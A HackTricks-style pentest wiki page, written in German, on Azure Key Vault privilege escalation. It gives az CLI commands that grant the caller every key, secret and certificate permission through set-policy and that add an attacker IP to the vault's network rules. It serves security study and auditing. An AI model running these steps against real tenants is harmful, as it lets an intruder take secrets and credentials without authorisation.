# Az - Key Vault Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Azure Key Vault

Für weitere Informationen zu diesem Dienst siehe:

{{#ref}}
../az-services/az-keyvault.md
{{#endref}}

### `Microsoft.KeyVault/vaults/write`

Ein Angreifer mit dieser Berechtigung kann die Richtlinie eines Key Vaults ändern (der Key Vault muss Zugriffsrichtlinien anstelle von RBAC verwenden).
```bash
# If access policies in the output, then you can abuse it
az keyvault show --name <vault-name>

# Get current principal ID
az ad signed-in-user show --query id --output tsv

# Assign all permissions
az keyvault set-policy \
--name <vault-name> \
--object-id <your-object-id> \
--key-permissions all \
--secret-permissions all \
--certificate-permissions all \
--storage-permissions all
```
### Modify Network Restrictions

Es könnte möglich sein, dass Sie über ausreichende Berechtigungen verfügen, um auf sensible Daten (wie den Wert eines Secrets) zuzugreifen, aber Sie können nicht darauf zugreifen, da der Key Vault auf ein bestimmtes Netzwerk beschränkt ist. Wenn Sie die Berechtigung haben, die Netzwerkbeschränkungen zu ändern, können Sie Ihre IP zur Liste der erlaubten IPs hinzufügen.
```bash
# Get the current network restrictions
az keyvault network-rule list --name <vault-name>

# Add your IP to the list
az keyvault network-rule add --name <vault-name> --ip-address <your-ip>
```
{{#include ../../../banners/hacktricks-training.md}}
